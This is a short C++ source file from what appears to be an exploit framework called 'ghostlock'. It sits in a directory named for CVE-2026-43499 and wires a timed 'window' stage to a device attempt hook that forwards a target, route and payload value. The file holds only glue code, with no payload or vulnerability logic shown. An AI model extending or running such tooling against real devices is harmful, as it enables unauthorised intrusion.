/** @file backend/cve_2026_43499/steps/window_runner.cpp
 *  The glue: one stage"s rhythm over the real attempt. See the header.
 */
#include "backend/cve_2026_43499/steps/window_runner.hpp"

#include <unistd.h>

namespace ghostlock::backend::cve_2026_43499::steps {
    namespace {
        inline constexpr const char *kWordsUnprepared = "step-words-unprepared";

        /** The device sleep, for the settle hook. */
        void settle_us(std::uint32_t us) noexcept { ::usleep(static_cast<useconds_t>(us)); }

        /** The attempt hook the stage calls: it reuses the WindowAttempt the caller prepared. */
        bool attempt_hook(void *context) noexcept { return window_attempt_once_device(context); }
    }  // namespace

    const char *run_window_stage_with_attempt(WindowStep step, WindowStageRequest &request,
                                              WindowStageContext &context) noexcept {
        if (context.chain == nullptr || context.target == nullptr || context.window == nullptr) {
            return kWordsUnprepared;
        }
        WindowAttempt attempt{};
        attempt.chain = context.chain;
        attempt.target = context.target;
        attempt.window = context.window;
        /* 引擎与载荷那一对：调用方持有引擎，本层只转发。 */
        attempt.route = context.route;
        attempt.payload_target = context.payload_target;
        attempt.payload_value = context.payload_value;
        request.attempt = &attempt_hook;
        request.context = &attempt;
        if (request.settle == nullptr) { request.settle = &settle_us; }
        return run_window_stage(step, request);
    }
}  // namespace ghostlock::backend::cve_2026_43499::steps
